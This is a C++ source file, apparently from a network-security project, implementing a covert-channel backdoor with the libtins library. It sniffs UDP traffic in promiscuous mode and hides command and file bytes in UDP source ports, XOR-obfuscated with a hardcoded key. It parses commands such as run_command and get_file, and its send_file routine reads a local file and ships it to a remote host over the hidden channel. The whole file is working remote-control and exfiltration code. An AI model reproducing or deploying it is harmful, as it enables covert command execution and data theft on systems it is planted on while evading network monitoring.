#include "covert_channel.h"
#include <tins/tins.h>
#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include "utilities.h"
#include <boost/algorithm/string.hpp>

using std::cout;
using std::endl;
using std::string;
using namespace Tins;

Covert_Channel::Covert_Channel()
{
    cout << "Covert_Channel Constructor" << endl;
    cmdMap.insert( cmd_pair(CMD::run_command, "run_command") );
    cmdMap.insert( cmd_pair(CMD::return_command, "return_cmmand") );
    cmdMap.insert( cmd_pair(CMD::get_file, "get_file") );
    cmdMap.insert( cmd_pair(CMD::return_file, "return_file") );

    key = "la732kljl8fuadskl08246akkf32k4jhh5f889df8989";
    server_id = "a1s2d3f4g5";
    eof_flag = "[Done]";
}


void Covert_Channel::setup() {
    string filter = "udp and dst port " + std::to_string(config.listen_port);
    SnifferConfiguration c;
    c.set_promisc_mode(true);
    c.set_immediate_mode(true);
    c.set_filter(filter);
    Sniffer sniffer(config.interface, c);
    sender.default_interface(config.interface);
    sniffer.sniff_loop(make_sniffer_handler(this, &Covert_Channel::handle));
}

bool Covert_Channel::handle(PDU& pdu) {
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    uchar_vector payload = udp.rfind_pdu<RawPDU>().payload();

    DataConverter dx;
    dx.uint16 = udp.sport();

    Address addr;
    addr.ip = ip.src_addr().to_string();
    addr.port = udp.sport();

    if(udp_recv(payload, addr))
        return true;

    return false;
}


bool Covert_Channel::udp_send(string dest_ip, int dst_port, uchar_vector hidden){
    string job_id = Utilities::random_string(server_id.length());

    DataConverter dc;
    while(hidden.size() > 0){
        if(hidden.size() > 1){
            dc.hidden.uchar_1 = hidden.at(0);
            dc.hidden.uchar_2 = hidden.at(1);
            hidden.erase (hidden.begin(), hidden.begin() + 2);
        }
        else
        {
            dc.hidden.uchar_1 = hidden.at(0);
            dc.hidden.uchar_2 = (unsigned char)' ';
            hidden.erase (hidden.begin(), hidden.begin() + 1);
        }
        string payload = server_id + job_id;
        if(hidden.size() == 0){
            payload += eof_flag;
        }
        cout << "Send Payload: " << payload << " hidden: " << dc.hidden.uchar_1 << dc.hidden.uchar_2 << " dx.port: " << dc.uint16 << endl;
        Utilities::xor_crypt(std::to_string(dc.uint16), payload);
        Utilities::xor_crypt(key, payload);
        IP pkt = IP(dest_ip) / UDP(dst_port, dc.uint16) / RawPDU(payload);
        sender.send(pkt);
    }

    return true;
}


bool Covert_Channel::udp_recv(uchar_vector v_payload, Address src_address){
    string payload(v_payload.begin(), v_payload.end());
    DataConverter dc;
    dc.uint16 = src_address.port;
    Utilities::xor_crypt(key, payload);
    Utilities::xor_crypt(std::to_string(dc.uint16), payload);

    cout << "Recv Payload: " << payload << endl;
    int sid_length = server_id.length();
    int jid_length = server_id.length();

    string payload_sid_tag(payload.begin(), payload.begin() + sid_length);

    //check if this is a valid packet
    if(payload_sid_tag == server_id){
        string payload_jid_tag(payload.begin() + sid_length, payload.begin() + sid_length + jid_length);

        cout << "Recv Payload: " << payload << " hidden: " << dc.hidden.uchar_1 << dc.hidden.uchar_2 << " dx.port: " << dc.uint16 << endl;

        bool found = false;
        // check if this is a packet for a current job
        for (auto& kv : jobs) {
            if (kv.first == payload_jid_tag){
                found = true;
                kv.second.job.push_back(dc.hidden.uchar_1);
                kv.second.job.push_back(dc.hidden.uchar_2);
                if(payload.size() >= 21){
                    cout << "payload bigger than 21: " << endl;
                    string payload_end_tag(payload.begin()+ sid_length + jid_length,
                                           payload.begin() + sid_length + jid_length + eof_flag.length());
                    if(payload_end_tag == eof_flag){
                        cout << "Finished job: : " << payload_jid_tag << endl;
                        finish_transfer(payload_jid_tag);
                    }
                }
                break;
            }
        }
        // not a current job? make a new job for it
        if(!found){
            Job j;
            j.job.push_back(dc.hidden.uchar_1);
            j.job.push_back(dc.hidden.uchar_2);
            j.address = src_address;
            jobs.insert({payload_jid_tag, j});
            cout << "Insert New Job: " << payload_jid_tag << " jobs.size(): " << jobs.size() << endl;
        }
        return true;
    }
    cout << "Incorrect ServerID" << endl;
    return false;

}

bool Covert_Channel::finish_transfer(string payload_jid_tag){
    cout << "finish_transfer() " << endl;
    for (auto& kv : jobs) {
        if (kv.first == payload_jid_tag){
            cout << "Print Complete job: " << payload_jid_tag << endl;
            cout << "kv.second: ";
            for (auto& i: kv.second.job)
                cout << i;
            cout << endl;

            string command_argument(kv.second.job.begin(), kv.second.job.end());
            split_command_argument_with_regex(command_argument, kv.second);

            parse_command(kv.second);
        }
    }
    return true;
}

bool Covert_Channel::split_command_argument_with_regex(const string& command_argument, Job& j){
    //Regex for looking for text between [square brackets]
    std::regex rgx("\\[(.*?)\\]");
    std::smatch match;

    cout << "match: ";
    if (std::regex_search(command_argument, match, rgx)) {
        cout << match[1] << endl;
    }
    else{
        cout << "None" << endl;
        return false;
    }

    j.command = match[1];
    cout << "Command: " << j.command << endl;
    j.argument = string(command_argument.begin() + j.command.length() + 2, command_argument.end());
    boost::trim_right(j.argument);
    cout << "Argument: " << j.argument << endl;
    return true;
}


bool Covert_Channel::send_file(string dest_ip, int dest_port, string filename){
    string request;
    request += '[';
    request += cmdMap.left.find(CMD::return_file)->second;
    request += ']';
    request += '[';
    request += Utilities::basename(filename);
    request += ']';
    std::vector<unsigned char> hidden;
    Utilities::readfile(filename, hidden);
    int i =0;
    for(auto& c : request){
        hidden.insert(hidden.begin()+i, c);
        i++;
    }

    udp_send(dest_ip, dest_port, hidden);
    return true;
}
